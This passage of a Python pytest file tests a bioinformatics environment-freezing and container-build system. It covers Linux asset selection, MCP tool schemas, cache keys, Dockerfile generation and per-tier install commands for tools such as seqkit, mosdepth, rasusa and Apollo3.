    # env build fields (packages/install_steps) are NOT part of the workflow spec
    assert not hasattr(wf, "packages") or "packages" not in wf.model_dump()
    assert "env_content_digest" in wf.to_yaml()


# ---------------------------------------------------------------------------
# Re-spine shakeout fixes — cross-arch recipe freeze (B) + WorkflowSpec
# self-verifiability (D) + guide version fallback (C).
# ---------------------------------------------------------------------------

def test_pick_platform_asset_disambiguates_os_and_arch():
    """The pure asset selector picks the right OS+arch, skips checksum sidecars,
    and rejects the wrong arch (so a darwin/arm asset is never used for linux64)."""
    from agent.skills.resolver import _pick_platform_asset
    assets = [
        "https://x/tool_darwin_amd64.tar.gz", "https://x/tool_darwin_arm64.tar.gz",
        "https://x/tool_linux_amd64.tar.gz",  "https://x/tool_linux_amd64.tar.gz.md5.txt",
        "https://x/tool_linux_arm64.tar.gz",  "https://x/tool_windows_amd64.exe.tar.gz",
    ]
    assert _pick_platform_asset(assets).endswith("tool_linux_amd64.tar.gz")
    assert _pick_platform_asset(assets, target_arch="arm64").endswith("tool_linux_arm64.tar.gz")
    # x86_64 alias + no linux asset → None (don't fall back to a wrong-OS build)
    assert _pick_platform_asset(["https://x/tool_darwin_arm64.tar.gz"]) is None


def test_pick_platform_asset_bare_binary_fallback():
    """Bare-named single-binary releases (mosdepth ships `mosdepth`, somalier ships
    `somalier`: a Linux static binary with NO platform tokens) must still resolve —
    the permissive fallback accepts an untagged asset, and the in-image smoke verify
    is the safety net against a wrong pick. Foreign-OS/arch assets stay excluded even
    in the fallback."""
    from agent.skills.resolver import _pick_platform_asset
    # mosdepth: ['mosdepth', 'mosdepth_d4'] — both untagged; shortest (the plain
    # tool) wins. somalier: a single bare binary.
    assert _pick_platform_asset(["https://x/mosdepth", "https://x/mosdepth_d4"]).endswith("/mosdepth")
    assert _pick_platform_asset(["https://x/somalier"]).endswith("/somalier")
    # A strict os+arch asset still wins over a bare one when both are present.
    assert _pick_platform_asset(
        ["https://x/tool", "https://x/tool_linux_amd64.tar.gz"]).endswith("tool_linux_amd64.tar.gz")
    # Fallback never crosses to a foreign OS / competing arch, even with no strict match.
    assert _pick_platform_asset(["https://x/tool_darwin", "https://x/tool.exe"]) is None
    assert _pick_platform_asset(["https://x/tool-aarch64"]) is None
    # A lone Linux-only build with the OS token but no arch token resolves (loose).
    assert _pick_platform_asset(["https://x/tool-linux"]).endswith("tool-linux")


def test_resolve_linux_asset_uses_installed_tag(monkeypatch):
    """From the host (darwin) asset URL, resolve the SAME release's linux/amd64
    asset — by TAG, not 'latest'. A non-github URL whose filename names a
    FOREIGN OS (darwin/macos/windows) is still refused; a platform-untagged
    URL is accepted under the loose-pass rule (the smoke verify in the build
    container is the net for wrong-arch picks)."""
    from agent.skills import resolver as r
    fake = {"assets": [{"browser_download_url": u} for u in [
        "https://github.com/o/repo/releases/download/v1.2.3/tool_darwin_arm64.tar.gz",
        "https://github.com/o/repo/releases/download/v1.2.3/tool_linux_amd64.tar.gz",
        "https://github.com/o/repo/releases/download/v1.2.3/tool_linux_amd64.tar.gz.md5",
    ]]}
    monkeypatch.setattr(r, "_fetch_json", lambda url, timeout=12: (fake, ""))
    got = r.resolve_linux_asset(
        "https://github.com/o/repo/releases/download/v1.2.3/tool_darwin_arm64.tar.gz")
    assert got["found"] and got["asset_name"] == "tool_linux_amd64.tar.gz"
    assert got["tag"] == "v1.2.3" and got["repo"] == "o/repo"
    # Foreign-OS-tagged vendor URL: still refused
    assert r.resolve_linux_asset("https://vendor.com/downloads/tool_darwin_arm64.bin")["found"] is False


def test_resolve_linux_asset_accepts_vendor_cdn_linux_url():
    """D1 — Oxford Nanopore's dorado ships only on a CDN (no GitHub release
    assets). Pre-fix, `resolve_linux_asset` refused any non-github URL even
    when the filename already identified the ship platform. Now we accept
    when the filename names linux+amd64 (strict pass)."""
    from agent.skills import resolver as r
    url = "https://cdn.oxfordnanoportal.com/software/analysis/dorado-2.0.0-linux-x64.tar.gz"
    got = r.resolve_linux_asset(url)
    assert got["found"] is True
    assert got["url"] == url
    assert got["asset_name"] == "dorado-2.0.0-linux-x64.tar.gz"
    # tag/repo empty for CDN URLs (no github metadata to extract)
    assert got["tag"] == "" and got["repo"] == ""


def test_resolve_linux_asset_accepts_platform_neutral_vendor_url():
    """A vendor URL with NO platform tokens (and no foreign-os tokens) falls
    into the loose pass — the smoke verify in the build container is the
    net for a wrong-arch binary. This matches the behavior the github
    release-asset path has for tools that ship a single Linux static
    binary (mosdepth, somalier)."""
    from agent.skills import resolver as r
    got = r.resolve_linux_asset("https://vendor.com/downloads/tool.bin")
    assert got["found"] is True
    assert got["asset_name"] == "tool.bin"


def test_resolve_linux_asset_refuses_foreign_arch_vendor_url():
    """A vendor URL naming the WRONG arch is still rejected — both the strict
    and loose passes exclude foreign-arch filenames."""
    from agent.skills import resolver as r
    got = r.resolve_linux_asset("https://vendor.com/downloads/tool-linux-aarch64.tar.gz")
    assert got["found"] is False


def test_resolve_linux_asset_refuses_empty_url():
    """Empty URL → explicit refusal (caller must pass something)."""
    from agent.skills import resolver as r
    got = r.resolve_linux_asset("")
    assert got["found"] is False
    assert "no binary_url" in got.get("reason", "").lower()


# =============================================================================
# Batch-1 stress-test fixes (2026-05-27) — MCP schema exports list-defaulted
# parameters (D4)
# =============================================================================


def test_mcp_freeze_schema_includes_licenses():
    """D4 — pre-fix `licenses: list[str] = []` (mutable default) was missing
    from the FastMCP schema export. An agent calling freeze(licenses=["MIT"])
    raised pydantic 'Input should be a valid list' because the param wasn't
    in the schema. With `Optional[list[str]] = None` (default None, unwrapped
    internally) the schema picks it up. This makes I13-gated builds reachable
    from the MCP surface (a gated build MUST supply licenses or I13 refuses)."""
    import asyncio
    from agent.mcp_server import mcp
    async def _get():
        return await mcp.get_tool("freeze")
    tool = asyncio.run(_get())
    schema = tool.parameters
    assert "licenses" in schema["properties"], (
        "licenses parameter must surface in the MCP schema (was missing pre-D4 "
        "fix due to mutable default = [] hiding it from FastMCP's extractor)"
    )
    # anyOf array/null — the Optional[list[str]] shape
    prop = schema["properties"]["licenses"]
    assert prop["default"] is None
    types = {sub.get("type") for sub in prop.get("anyOf", [])}
    assert "array" in types and "null" in types


def test_mcp_install_pip_package_schema_includes_pip_flags():
    """Companion to D4 — install_pip_package's pip_flags MUST be in the
    schema or agents can't pass `--no-binary :all:` from the MCP surface
    (forcing the run_in_env fallback that P3 fixes)."""
    import asyncio
    from agent.mcp_server import mcp
    async def _get():
        return await mcp.get_tool("install_pip_package")
    tool = asyncio.run(_get())
    schema = tool.parameters
    assert "pip_flags" in schema["properties"]
    prop = schema["properties"]["pip_flags"]
    assert prop["default"] is None


# =============================================================================
# VERIFICATION-DRIVEN fixes (2026-05-27 second round) — B7 + P4
# =============================================================================


def test_freeze_cache_key_reflects_install_record_filled_version(monkeypatch, tmp_path):
    """B7 — when the caller asks `tools=['busco']` (no version pin), the
    cache key MUST reflect the version actually installed (per
    install_steps[*].installed_packages). Pre-fix the version-fill happened
    AFTER request_key was computed, so two different installed versions
    collided on `busco|linux/amd64|none` — the BUSCO verification re-stress
    surfaced this as a wrong-version trust violation isomorphic to B1."""
    from agent.mcp_server import _resolve_versions_from_install_record
    from agent.skills.freeze import request_key, parse_tools

    draft_6 = {"install_steps": [{
        "tool": "conda", "subcommand": "install",
        "installed_packages": [{"name": "busco", "version": "6.0.0"}],
    }]}
    draft_5 = {"install_steps": [{
        "tool": "conda", "subcommand": "install",
        "installed_packages": [{"name": "busco", "version": "5.8.3"}],
    }]}
    parsed = parse_tools(["busco"])

    # The freeze() function now applies _resolve_versions_from_install_record
    # BEFORE request_key — so the cache key for the two drafts must differ.
    filled_6 = _resolve_versions_from_install_record(parsed, draft_6)
    filled_5 = _resolve_versions_from_install_record(parsed, draft_5)
    k6 = request_key([(n, v or "") for n, v in filled_6], "linux-64", "none")
    k5 = request_key([(n, v or "") for n, v in filled_5], "linux-64", "none")
    assert k6 != k5
    assert "6.0.0" in k6
    assert "5.8.3" in k5


def test_ensure_python_for_pip_injects_python_and_pip_when_flag_bearing():
    """P4 — pixi/uv envs don't ship `pip` (uv replaces it). A long-tail
    `python -m pip install --no-binary :all: pysam` needs BOTH python AND
    the pip module in the env. The verification re-stress hit `pip: command
    not found` inside the build container; the fix declares pip explicitly
    when has_flag_bearing_pip=True."""
    from agent.skills.env_freeze import ensure_python_for_pip

    # No pip at all → no python, no pip injection
    out = ensure_python_for_pip(["samtools=1.21"], has_pip=False,
                                has_flag_bearing_pip=False)
    assert out == ["samtools=1.21"]

    # Flagless pip only → python injected, pip NOT (engine uses uv, not pip)
    out = ensure_python_for_pip(["samtools=1.21"], has_pip=True,
                                has_flag_bearing_pip=False)
    assert out == ["samtools=1.21", "python"]

    # Flag-bearing pip → python AND pip injected
    out = ensure_python_for_pip(["samtools=1.21"], has_pip=False,
                                has_flag_bearing_pip=True)
    assert "python" in out and "pip" in out

    # Already-declared python is not duplicated
    out = ensure_python_for_pip(["python=3.11", "samtools=1.21"],
                                has_pip=False, has_flag_bearing_pip=True)
    python_count = sum(1 for s in out if s.startswith("python"))
    assert python_count == 1
    assert "pip" in out

    # Already-declared pip is not duplicated
    out = ensure_python_for_pip(["python", "pip"], has_pip=False,
                                has_flag_bearing_pip=True)
    pip_count = sum(1 for s in out if s.strip() == "pip" or s.startswith("pip="))
    assert pip_count == 1


def test_pip_install_with_flags_uses_python_dash_m_pip():
    """P4 (defense-in-depth) — the generated command uses `python -m pip
    install` (the module form) rather than bare `pip install`. Works
    whenever the pip MODULE is available, even if the `pip` binary
    isn't on PATH. Belt-and-suspenders with ensure_python_for_pip
    declaring pip explicitly."""
    from agent.skills import install_commands
    spec = install_commands.pip_install_with_flags(
        "pysam", version="0.24.0", flags=["--no-binary", ":all:"],
    )
    assert "python -m pip install" in spec["command"]
    assert "--no-binary" in spec["command"]
    assert "pysam==0.24.0" in spec["command"]


def test_env_freeze_passes_has_flag_bearing_pip_through(monkeypatch):
    """End-to-end P4 — env_freeze.build_env_image must pass the flag-bearing
    pip flag to ensure_python_for_pip so the conda layer declares pip."""
    from agent.skills import env_freeze

    captured = {}

    class _StubEB:
        def __init__(self, *a, **kw):
            pass
        def add_conda(self, specs, verify):
            captured["conda_specs"] = list(specs)
            return self
        def add_pip(self, specs, verify):
            return self
        def add_tool(self, spec):
            return self
        def run(self):
            return {"success": True, "image": "x", "image_digest": "sha256:" + "0" * 64,
                    "verifications": [], "content_digest": "sha256:y"}
        def request_key(self):
            return "stub"

    monkeypatch.setattr(env_freeze, "EnvBuild", _StubEB)

    spec = {"install_steps": [{
        "tool": "pip", "subcommand": "install",
        "installed_packages": [{
            "name": "pysam", "version": "0.24.0",
            "install_method": {"type": "pip",
                               "source": "pip install --no-binary :all: pysam==0.24.0",
                               "pip_flags": ["--no-binary", ":all:"]},
        }]}]}
    env_freeze.build_env_image(spec, name="x", primary_tools=["pysam"])
    cs = captured.get("conda_specs", [])
    # both python and pip must land in the conda layer
    assert any(s == "python" or s.startswith("python=") for s in cs), (
        "python missing from conda_specs when only flag-bearing pip is present")
    assert any(s == "pip" or s.startswith("pip=") for s in cs), (
        "pip missing from conda_specs when flag-bearing pip is present "
        "(pre-P4: long-tail `pip install` hit `pip: command not found`)")


def _draft_with_binary():
    """A draft-shaped dict: bootstrap python (conda create) + a binary-tier tool."""
    return {
        "pipeline_name": "seqkit", "conda_env": "bioinf_seqkit",
        "install_steps": [
            {"step": 1, "tool": "conda", "subcommand": "create",
             "installed_packages": [{"name": "python", "version": "3.11"}]},
            {"step": 2, "tool": "curl", "subcommand": "download",
             "installed_packages": [{"name": "seqkit", "install_method": {
                 "type": "binary",
                 "binary_url": "https://github.com/shenwei356/seqkit/releases/download/v2.13.0/seqkit_darwin_arm64.tar.gz",
                 "sha256": "dac78516", "local_path": "/e/share/seqkit/seqkit"}}]},
        ],
    }


def test_non_conda_installs_reads_draft_install_steps():
    """non_conda_installs must read the DRAFT (install_steps), not just the
    finalize-derived packages[] — else a binary env looks pure-conda and gets
    wrongly adopted. Bootstrap python must NOT count as a conda 'tool'."""
    from agent.skills import freeze
    d = _draft_with_binary()
    nc = freeze.non_conda_installs(d)
    assert [(x["name"], x["type"]) for x in nc] == [("seqkit", "binary")]


def _db():
    import yaml as _yaml
    from pathlib import Path as _P
    from agent.skills.docker_builder import DockerBuilder
    cfg = _yaml.safe_load((_P(__file__).parent.parent / "config" / "agent_config.yaml").read_text())
    return DockerBuilder(cfg)


def test_cargo_go_install_method_captures_toolchain_version(tmp_path, monkeypatch):
    """install_cargo_tool / install_go_tool must record the host toolchain version
    + the replay fields (crate/package, version, binary_name) in install_method, so
    freeze can rebuild reproducibly. The version is parsed from `rustc --version`
    / `go version`."""
    import yaml as _yaml
    from pathlib import Path as _P
    from agent.skills.env_manager import EnvManager
    cfg = _yaml.safe_load((_P(__file__).parent.parent / "config" / "agent_config.yaml").read_text())
    em = EnvManager(cfg)
    em.envs_dir = tmp_path
    (tmp_path / "bioinf_x").mkdir()

    def fake_run(env, cmd, timeout=0, **kw):
        if "rustc --version" in cmd:
            return {"returncode": 0, "stdout": "rustc 1.83.0 (90b35a623 2024-11-26)", "stderr": ""}
        if "go version" in cmd:
            return {"returncode": 0, "stdout": "go version go1.22.6 darwin/arm64", "stderr": ""}
        if cmd.startswith("which "):
            name = cmd.split()[1]
            return {"returncode": 0, "stdout": f"/{env}/bin/{name}", "stderr": ""}
        return {"returncode": 0, "stdout": "", "stderr": ""}   # cargo/go install
    monkeypatch.setattr(em, "run_in_env", fake_run)

    rc = em.install_cargo_tool("bioinf_x", "rasusa", version="4.1.0")
    im = rc["install_method"]
    assert im["type"] == "cargo" and im["rust_version"] == "1.83.0"
    assert im["crate"] == "rasusa" and im["version"] == "4.1.0" and im["binary_name"] == "rasusa"

    rg = em.install_go_tool("bioinf_x", "github.com/virus-evolution/gofasta", version="v1.2.3")
    im = rg["install_method"]
    assert im["type"] == "go" and im["go_version"] == "1.22.6"
    assert im["package"].endswith("gofasta") and im["version"] == "v1.2.3" and im["binary_name"] == "gofasta"


def test_non_conda_installs_includes_cargo_and_go():
    """freeze's recipe dispatch keys off non_conda_installs — cargo/go installs
    must surface there with their install_method so they get replayed (not adopted)."""
    from agent.skills.freeze import non_conda_installs
    draft = {"install_steps": [
        {"installed_packages": [{"name": "rasusa",
            "install_method": {"type": "cargo", "crate": "rasusa", "version": "4.1.0",
                               "binary_name": "rasusa", "rust_version": "1.83.0"}}]},
        {"installed_packages": [{"name": "gofasta",
            "install_method": {"type": "go", "package": "github.com/x/gofasta",
                               "version": "v1.2.3", "binary_name": "gofasta", "go_version": "1.22.6"}}]},
    ]}
    nc = {x["name"]: x["type"] for x in non_conda_installs(draft)}
    assert nc == {"rasusa": "cargo", "gofasta": "go"}


def test_conda_to_docker_platform_map():
    """freeze's conda subdir must normalize to a docker platform for buildx."""
    from agent.mcp_server import _CONDA_TO_DOCKER_PLATFORM as M
    assert M["linux-64"] == "linux/amd64"
    assert M["linux-aarch64"] == "linux/arm64"


def test_perl_install_method_records_replay_fields(tmp_path, monkeypatch):
    """install_perl_package must record module/distribution/cpanm_flags/build_env in
    install_method so freeze can replay the cpanm build reproducibly."""
    import yaml as _yaml
    from pathlib import Path as _P
    from agent.skills.env_manager import EnvManager
    cfg = _yaml.safe_load((_P(__file__).parent.parent / "config" / "agent_config.yaml").read_text())
    em = EnvManager(cfg)
    em.envs_dir = tmp_path
    (tmp_path / "bioinf_x").mkdir()
    monkeypatch.setattr(em, "run_in_env",
                        lambda env, cmd, timeout=0, **kw: {"returncode": 0, "stdout": "", "stderr": ""})
    r = em.install_perl_package("bioinf_x", "Bio::DB::HTS", cpanm_flags="--notest",
                                build_env="HTSLIB_DIR=$CONDA_PREFIX")
    im = r["install_method"]
    assert im["type"] == "perl" and im["module"] == "Bio::DB::HTS"
    assert im["distribution"] == "Bio::DB::HTS" and im["cpanm_flags"] == "--notest"
    assert im["build_env"] == "HTSLIB_DIR=$CONDA_PREFIX"


def test_perl_missing_cpanm_gives_actionable_error(tmp_path, monkeypatch):
    """VEP probe finding #4: when cpanm isn't in the env, install_perl_package must
    return an ACTIONABLE refusal naming perl-app-cpanminus — not a bare 'cpanm install
    failed' that leaves a full-auto agent stuck on command-not-found."""
    import yaml as _yaml
    from pathlib import Path as _P
    from agent.skills.env_manager import EnvManager
    cfg = _yaml.safe_load((_P(__file__).parent.parent / "config" / "agent_config.yaml").read_text())
    em = EnvManager(cfg)
    em.envs_dir = tmp_path
    (tmp_path / "bioinf_x").mkdir()
    monkeypatch.setattr(em, "run_in_env",
                        lambda env, cmd, timeout=0, **kw: {"returncode": 127, "stdout": "",
                                                           "stderr": "bash: cpanm: command not found"})
    r = em.install_perl_package("bioinf_x", "Text::CSV")
    assert r["outcome"] == "refused" and r["code"] == "env_manager.perl_cpanm_missing"
    assert "perl-app-cpanminus" in r["error"]


def test_container_native_dockerfile_bakes_recorded_commands():
    """The container-native emitter: an engine env-layer from the lock + one verbatim
    RUN per recorded long-tail command (NO per-tier translation), MULTI-STAGE — a
    builder with the full toolchain and a slim runtime that COPYs only the env +
    artifacts (Phase D)."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    steps = [{"command": "curl -fsSL x.tgz | tar -xz -C /usr/local/bin seqkit",
              "purpose": "seqkit release binary"}]
    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=True, longtail_steps=steps)
    # two stages: a named builder + a slim runtime
    assert "FROM debian:bookworm-slim AS builder" in df and df.count("FROM debian:bookworm-slim") == 2
    assert "pixi.sh/install.sh" in df                      # pixi engine layered on (builder)
    assert "COPY pixi.toml pixi.lock ./" in df and "pixi install --locked" in df  # reproducible conda/pip
    assert "# seqkit release binary" in df
    assert "RUN curl -fsSL x.tgz | tar -xz -C /usr/local/bin seqkit" in df        # baked VERBATIM (builder)
    # runtime stage COPYs the env (same paths) + the built artifacts from the builder
    assert "COPY --from=builder /root/.pixi /root/.pixi" in df
    assert "COPY --from=builder /work /work" in df
    assert "COPY --from=builder /usr/local /usr/local" in df
    # build toolchain is BUILD-only; the runtime apt is the slim *.so set (no build-essential
    # after the runtime FROM)
    runtime = df.split("# ---- runtime image (shipped) ----", 1)[1]
    assert "build-essential" not in runtime and "zlib1g-dev" not in runtime
    assert "zlib1g" in runtime and "ca-certificates" in runtime
    # no conda/pip tools → no env layer; long-tail only still works (still multi-stage)
    df2 = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=False, longtail_steps=steps)
    assert "pixi install --locked" not in df2 and "COPY pixi.toml" not in df2
    assert "COPY --from=builder /root/.pixi" not in df2     # no env to copy
    assert "COPY --from=builder /usr/local /usr/local" in df2
    assert "RUN curl -fsSL x.tgz | tar -xz -C /usr/local/bin seqkit" in df2


def test_container_native_engine_is_swappable():
    """The locus is engine-agnostic: swap pixi→micromamba and ONLY the env-layer
    lines change; the long-tail bake + base are identical. Proves we're not married
    to pixi ('universal adapter' one level down)."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine, MicromambaEngine
    steps = [{"command": "install -m0755 /tmp/mosdepth /usr/local/bin/", "purpose": "mosdepth"}]
    dp = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(), has_env_layer=True, longtail_steps=steps)
    dm = emit_dockerfile("debian:bookworm-slim", engine=MicromambaEngine(), has_env_layer=True, longtail_steps=steps)
    # pixi-specific vs micromamba-specific env layers
    assert "pixi install --locked" in dp and "micromamba" not in dp
    assert "micromamba create -y -n env --file env.lock" in dm and "pixi" not in dm
    assert 'env_engine="pixi"' in dp and 'env_engine="micromamba"' in dm
    # identical locus: same base + same verbatim long-tail bake regardless of engine
    assert "FROM debian:bookworm-slim" in dp and "FROM debian:bookworm-slim" in dm
    assert "RUN install -m0755 /tmp/mosdepth /usr/local/bin/" in dp
    assert "RUN install -m0755 /tmp/mosdepth /usr/local/bin/" in dm
    # micromamba's explicit lock is single-platform but reproducible (URLs+sha)
    assert "env.lock" in MicromambaEngine().lock_artifacts()


def test_container_native_repo_name_sanitized():
    """docker repo names must be lowercase [a-z0-9._-]; freeze must sanitize a
    pipeline name like 'VEP_annotate' rather than fail the build."""
    from agent.skills.container_build import _docker_repo
    assert _docker_repo("VEP_annotate") == "vep_annotate"   # uppercase→lower; _ is legal
    assert _docker_repo("phaseA_demo") == "phasea_demo"
    assert _docker_repo("Tool:weird name") == "tool-weird-name"  # illegal chars → '-'
    assert _docker_repo("samtools") == "samtools"
    assert _docker_repo("---") == "bioinf"                   # empty after strip → fallback


def test_install_command_generators_self_contained_tiers():
    """Per-tier knowledge in ONE place: each generator returns a shell command that
    installs to /usr/local/bin + an evidence check. These get baked VERBATIM."""
    from agent.skills import install_commands as ic
    # release binary (archive): download → sha → extract → find → symlink
    rb = ic.release_binary("seqkit", "https://x/seqkit_linux_amd64.tar.gz",
                           sha256="DEAD", binary_in_archive="seqkit")
    assert "curl -fsSL -o seqkit_linux_amd64.tar.gz" in rb["command"]
    assert "dead  seqkit_linux_amd64.tar.gz" in rb["command"] and "sha256sum -c -" in rb["command"]
    assert "tar -xf" in rb["command"] and "/usr/local/bin/seqkit" in rb["command"]
    # bare binary: install, no extract
    rb2 = ic.release_binary("mosdepth", "https://x/mosdepth")
    assert "install -m 0755 mosdepth /usr/local/bin/mosdepth" in rb2["command"]
    # source: SWH-fallback clone → checkout → build → MANUAL install (no make install target).
    # The `_swh_clone` wrapper is the Phase 3 link-rot protection — tries upstream first,
    # falls back to Software Heritage's vault on failure; final `git checkout <sha>` proves
    # the bytes either way.
    s = ic.source("tabtk", "https://github.com/lh3/tabtk", ref="abc123", build_command="make")
    assert "_swh_clone https://github.com/lh3/tabtk abc123 /opt/tools/tabtk/src" in s["command"]
    assert "git checkout abc123" in s["command"] and "make" in s["command"]
    assert "install -m 0755 /opt/tools/tabtk/src/tabtk /usr/local/bin/tabtk" in s["command"]
    # N3 (batch-3): wrapper-smoke evidence — invoke the binary, don't just
    # check that the file exists. `command -v tabtk` still appears as the
    # last fallback for tools that accept no args.
    assert "tabtk --help" in s["evidence"]
    assert "command -v tabtk" in s["evidence"]
    # script repo (half-baked run-by-path): SWH-fallback clone → wrapper exec'ing the entry script
    sr = ic.script_repo("mytool", "https://github.com/lab/mytool", script_rel="run.py",
                        interpreter="python")
    assert "_swh_clone https://github.com/lab/mytool" in sr["command"]
    assert "exec python /opt/tools/mytool/run.py" in sr["command"]
    assert "/usr/local/bin/mytool" in sr["command"]


# =============================================================================
# Batch-3 Apollo3 followup (2026-05-27) — C5: N2 + N3
#
# N2: source-tier `_map_install` only knew two shapes — script_repo (entrypoint,
# no build) and source (build_command + bin_path). A yarn-PnP Node monorepo
# needs BOTH: build_command to produce dist/ AND a script entrypoint to invoke
# it. Without it the replay skipped the build_command entirely, leaving
# dist/main.js unbuilt → in-image MODULE_NOT_FOUND at execution.
#
# N3: wrapper-tier evidence was `command -v {wrap}`, which passes IFF the
# wrapper file exists. The Apollo3 wrapper passed even though running it
# crashed with MODULE_NOT_FOUND — structurally the same cheat as echo/true/:
# that the contract already rejects, just at the wrapper layer. Default
# evidence is now a smoke chain that ACTUALLY invokes: `--help || --version
# || -h || command -v`, with the bare `command -v` only as the last-resort
# fallback for tools that accept no help/version flags.
# =============================================================================


def test_script_repo_with_build_command_runs_build_before_wrapper(monkeypatch):
    """N2 (batch-3) — when script_repo is called with build_command + entrypoint
    together (the yarn-PnP Node / pip-install-editable + python -m shape), the
    build command runs IN THE CLONE DIR before the wrapper is written, so the
    wrapper points at assets the build actually produced."""
    from agent.skills import install_commands as ic
    sr = ic.script_repo(
        "apollo3", "https://github.com/GMOD/Apollo3", ref="abc123",
        script_rel="packages/apollo-collaboration-server/dist/main.js",
        interpreter="node",
        build_command="yarn install && yarn workspace apollo-collaboration-server build",
    )
    cmd = sr["command"]
    # the build command lands BEFORE the wrapper write
    build_idx = cmd.find("yarn install && yarn workspace apollo-collaboration-server build")
    wrap_idx = cmd.find("/usr/local/bin/apollo3")
    assert build_idx != -1, "build_command must be in the replay sequence"
    assert wrap_idx != -1, "wrapper write must be in the replay sequence"
    assert build_idx < wrap_idx, (
        "build_command must run BEFORE the wrapper is written — otherwise the "
        "wrapper points at assets that don't exist yet (the N2 bug)")
    # the wrapper invokes the interpreter on the built entrypoint
    assert "exec node /opt/tools/apollo3/packages/apollo-collaboration-server/dist/main.js" in cmd


def test_script_repo_without_build_command_keeps_pure_run_by_path():
    """N2 (back-compat) — script_repo without build_command remains the
    pure run-by-path shape: clone + chmod entry + wrapper. No extra build."""
    from agent.skills import install_commands as ic
    sr = ic.script_repo("mytool", "https://github.com/lab/mytool",
                        script_rel="run.py", interpreter="python")
    cmd = sr["command"]
    # No build step injected
    assert "yarn" not in cmd and "pip install" not in cmd
    assert "exec python /opt/tools/mytool/run.py" in cmd


def test_script_repo_default_evidence_is_wrapper_smoke_not_command_v_only():
    """N3 (batch-3) — the default evidence for a script_repo wrapper INVOKES
    the wrapper (`--help || --version || -h || command -v`), proving the
    wrapper EXECUTES. Pre-fix it was bare `command -v {wrap}`, which passed
    even when the wrapped script crashed on every actual invocation
    (Apollo3's dist/main.js MODULE_NOT_FOUND)."""
    from agent.skills import install_commands as ic
    sr = ic.script_repo("apollo3", "https://github.com/GMOD/Apollo3",
                        script_rel="dist/main.js", interpreter="node")
    ev = sr["evidence"]
    # invokes the wrapper FIRST, falls back to command -v ONLY as last resort
    assert "apollo3 --help" in ev
    assert "apollo3 --version" in ev
    assert "apollo3 -h" in ev
    # the order: invocation chains FIRST, then `command -v` as last fallback
    cmdv_idx = ev.find("command -v apollo3")
    help_idx = ev.find("apollo3 --help")
    assert 0 <= help_idx < cmdv_idx, (
        "default evidence must INVOKE the wrapper before falling back to "
        "command -v (which is the N3 cheat shape)")


def test_source_default_evidence_upgraded_to_wrapper_smoke():
    """N3 (defense-in-depth) — the `source` generator (compiled C tier) had
    the same `command -v` vulnerability. Now it tries the binary first, falls
    back to `command -v` as last resort."""
    from agent.skills import install_commands as ic
    s = ic.source("tabtk", "https://github.com/lh3/tabtk", ref="abc123",
                  build_command="make")
    ev = s["evidence"]
    assert "tabtk --help" in ev
    assert "command -v tabtk" in ev  # still present as the fallback
    assert ev.index("tabtk --help") < ev.index("command -v tabtk")


def test_cargo_and_go_default_evidence_upgraded_to_wrapper_smoke():
    """N3 (defense-in-depth) — same upgrade for the toolchain-coupled tiers."""
    from agent.skills import install_commands as ic
    c = ic.cargo("rasusa", "rasusa", version="2.0.0")
    assert "rasusa --help" in c["evidence"]
    assert "command -v rasusa" in c["evidence"]
    g = ic.go("gofasta", "github.com/virus-evolution/gofasta")
    assert "gofasta --help" in g["evidence"]
    assert "command -v gofasta" in g["evidence"]


def test_map_install_routes_entrypoint_plus_build_to_script_repo(monkeypatch):
    """N2 (batch-3) — _map_install must accept an install_method with
    entrypoint + build_command (no bin_path) and route through script_repo
    WITH the build_command threaded through. Pre-fix this combo got routed
    to script_repo but build_command was silently dropped."""
    from agent.skills.env_freeze import _map_install
    record = {
        "name": "apollo3", "type": "source",
        "install_method": {
            "type": "source",
            "source": "https://github.com/GMOD/Apollo3",
            "commit_sha": "8a6e4055",
            "entrypoint": "packages/apollo-collaboration-server/dist/main.js",
            "interpreter": "node",
            "build_command": "yarn install && yarn workspace apollo-collaboration-server build",
            # NO bin_path — this is the build+script-entry case
        },
    }
    out = _map_install(record)
    assert "spec" in out, f"expected a spec, got: {out}"
    spec = out["spec"]
    cmd = spec["command"]
    # the build_command must appear in the replay sequence
    assert "yarn install && yarn workspace apollo-collaboration-server build" in cmd
    # the entrypoint wrapper invocation is also present
    assert "exec node /opt/tools/apollo3/packages/apollo-collaboration-server/dist/main.js" in cmd


def test_map_install_rejects_compiled_without_bin_path_or_entrypoint():
    """N2 (regression guard) — a source install_method with NO entrypoint
    AND NO bin_path is non-replayable. Refuse cleanly; the new combo
    (entrypoint + build_command) doesn't loosen this check."""
    from agent.skills.env_freeze import _map_install
    record = {
        "name": "unknown", "type": "source",
        "install_method": {"type": "source", "source": "https://x",
                           "commit_sha": "abc",
                           "build_command": "make",   # neither bin_path nor entrypoint
                           },
    }
    out = _map_install(record)
    assert "error" in out
    assert "build_command + bin_path" in out["error"] or "entrypoint" in out["error"]


def test_install_command_generators_toolchain_coupled_tiers():
    """cargo/go/perl build with the ENGINE's toolchain → engine_coupled=True so the
    command (and evidence) run via engine.run(). Output binaries are self-contained
    at runtime (/usr/local/bin); perl's module lives in the engine perl."""
    from agent.skills import install_commands as ic
    c = ic.cargo("rasusa", "rasusa", version="2.0.0")
    assert c["engine_coupled"] and "cargo install rasusa --version 2.0.0 --root /usr/local --locked" in c["command"]
    g = ic.go("gofasta", "github.com/virus-evolution/gofasta", version="v1.2.3")
    assert g["engine_coupled"] and "go install github.com/virus-evolution/gofasta@v1.2.3" in g["command"]
    p = ic.perl_cpanm("Bio::DB::HTS", build_env="HTSLIB_DIR=$CONDA_PREFIX")
    assert p["engine_coupled"] and "HTSLIB_DIR=$CONDA_PREFIX cpanm --notest Bio::DB::HTS" in p["command"]
    assert p["evidence"] == "perl -MBio::DB::HTS -e1"


def test_install_spec_engine_coupling_wraps_with_engine_run(monkeypatch):
    """ContainerBuild.install() wraps a coupled spec's command+evidence with
    engine.run() (so it's correct in the build container AND when baked), and leaves
    a self-contained spec bare."""
    from agent.skills.container_build import ContainerBuild, PixiEngine
    cb = ContainerBuild(engine=PixiEngine())
    cb.cid = "fake"
    calls = []
    monkeypatch.setattr(cb, "_sh", lambda args, timeout=0: (
        calls.append(args[-1]), {"returncode": 0, "stdout": "ok", "stderr": ""})[1])
    # coupled → wrapped with `pixi run`
    cb.install({"command": "cargo install rasusa --root /usr/local --locked",
